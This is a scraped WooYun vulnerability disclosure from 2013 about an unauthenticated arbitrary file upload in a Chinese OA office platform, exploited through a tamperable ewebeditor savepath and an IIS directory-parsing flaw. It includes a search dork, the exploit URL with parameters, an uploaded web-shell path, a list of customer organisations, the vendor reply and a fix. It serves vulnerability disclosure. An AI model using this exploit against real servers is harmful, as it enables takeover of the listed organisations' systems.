{"id": 8070, "wybug_id": "wooyun-2013-035334", "wybug_title": "北京联达动力OA协同办公管理平台任意文件上传漏洞", "wybug_corp": "联达动力", "wybug_author": "猪猪侠", "wybug_date": "2013-08-26 21:07", "wybug_open_date": "2013-11-24 21:08", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向公众公开  简要描述： 通过测试，发现北京联达动力信息科技发展有限公司旗下的OA协同办公管理平台，存在任意文件上传漏洞，用户无需登录，即可上传文件至服务器，并且当做脚本文件执行。 详细说明：  #0 本OA协同管理系统的客户源http://www.lkpower.com/templates/T_Second/index_150.html\n国务院港澳办国家体育总局国土资源部土地整理中心中国财政部投资评审中心中国农业科学院北京市教委北京市教工委山西省科学技术厅陕西省核工业地质局江苏省无线电管理局昆明市环境保护局昆明市水利局上海市宝山区公路管理署山东枣庄市工商行政管理局宁波江东区人民政府昆明市滇池管理局陕西人民广播电台沈阳广播电视台路桥集团国际建设股份有限公司中交第三公路工程局有限公司中交第四公路工程局有限公司中国建筑发展有限公司济南四建（集团）有限责任公司河南省宏力集团有限公司中国水电八局溪洛渡施工局北京天润子真建筑装饰有限责任公司北京康成人工环境工程有限公司首都医科大学附属北京安定医院北京中关村医院上海杨浦区疾病预防控制中心江西省人民医院安徽省合肥市第二人民医院无锡市妇幼保健医院徐州市肿瘤医院吴江市中医院泰州市人民医院北京体育大学北京化工大学北京大学网络教育学院中国地质大学长城学院天津工业大学天津商业大学天津职业技术师范学院中共河南省委党校重庆城市管理职业学院北京鼎事兴教育咨询有限公司济南铁路局哈尔滨铁路局南宁铁路局（车辆段）朔黄铁路肃宁分公司长沙机场高速路建设经营有限公司天津市政公路设备工程有限公司铁宇国际运输（天津）有限公司中国船舶重工集团公司中国兵器工业集团公司西北工业集团北方特种能源集团有限公司山西平阳重工机械有限责任公司西安东方机电（集团）有限公司中国石油集团测井有限公司中国寰球工程公司中煤第五建设公司中国水利电力物资有限公司淮南矿业（集团）有限责任公司甘肃省火电工程公司国电宁夏石嘴山发电有限责任公司湖北华清电力有限公司吉林龙华热电股份有限公司湖北郧县电力公司中机新能源开发有限公司浙江省台州供水有限公司中谷粮油集团公司中盐集团中远关西涂料化工有限公司北京三元集团有限责任公司深圳市泛谷药业有限公司昆明邦宇制药有限公司天津三华实业有限公司（韩资）天津天铁冶金集团有限公司（天津铁厂）湖南金荣企业集团厦门ABB低压电器设备有限公司无锡神羊实业（集团）有限公司深圳蓝韵集团有限公司北京怡海花园房地产开发有限公司北京中天海康投资有限公司北京东亚新华投资有限公司北京顺苑房地产开发有限公司北京昊远隆基房地产开发有限责任公司北京佳莲伟业房地产开发有限公司北京远中房地产开发有限公司德翰置业集团有限公司天津市房地产开发经营集团上海松源房地产开发有限公司北京英图光彩置业有限责任公司中国平安保险（集团）股份有限公司中国信达资产管理股份有限公司泰康人寿保险股份有限公司北京保险行业协会中国民族证券有限责任公司华宸信托有限责任公司北京远景环球投资顾问有限责任公司北京国富投资管理公司新时代证券有限责任公司天伦国际酒店管理集团北京天伦王朝酒店北京伯豪瑞廷酒店北京欣燕都酒店连锁有限公司北京蕉叶饮食有限公司北京南国苑餐饮管理有限公司北京黎昌海鲜大酒楼沈阳黎明国际酒店广州亚洲国际酒店中国普天信息产业集团公司中国铁通集团有限公司中国网通（集团）有限公司北京市通信公司大唐高鸿数据网络技术股份有限公司闪联信息技术工程中心有限公司四川电信实业集团有限责任公司北京交大网通信息技术有限公司北京富迪通科技发展公司中粮集团有限公司\n#1 问题描述OA协同办公管理平台调用了某开源编辑器，ewebeditor，savepath 可篡改导致可上传任意文件至 /love.asp/ 类似文件夹中，并讲上传的文件当做脚本文件执行。通过谷歌搜索：北京联达动力信息科技发展有限公司 intitle:登录http://222.132.***.***:8080/lkoa6/Editor/ewebeditor.htm?id=txtNR&style=coolblue&&savepathfilename=myText3&savepath=../LKUPLOADFILE/dzyjuploadfiles/love.asp/\n\n#2 成功上传后信息\n<IMG border=0 src=\"/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg\">\n   漏洞证明：  #3 SHELL 地址http://222.132.***.***:8080/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg\n\n   修复方案：  # 校验savepath，或强制客户使用iis7以上中间件。   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-08-30 22:58 厂商回复： CNVD确认并复现所述情况，通过互联网找到的用户实例较少，不过仍然可以确认为通用软件漏洞。从其官方网站用户列表找到的实例基本都处于内部网站，如果白帽子后续测试到其他实例，也欢迎继续以事件型漏洞提交。rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-26 21:10 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 北京联达动力OA协同办公管理平台任意文件上传漏洞    \n     2013-08-26 21:12 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  擦 关注数超过我了    \n     2013-08-26 21:18 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  @xsser 猪猪侠改行了，不玩大数据hack了。。不科学    \n     2013-08-26 21:21 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 你update下数据库嘛    \n     2013-08-26 21:30 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  @小胖胖要减肥 他直接drop    \n     2013-08-26 22:00 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  发来贺电    \n     2013-08-27 12:43 |    \t\tfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:79        | 想刷个6D)\t\t \n  猪哥 玩得很high啊    \n     2013-09-05 13:45 |    \t\tizj \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 爱老婆)\t\t \n  猪哥的大数据好玩，多来几发    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}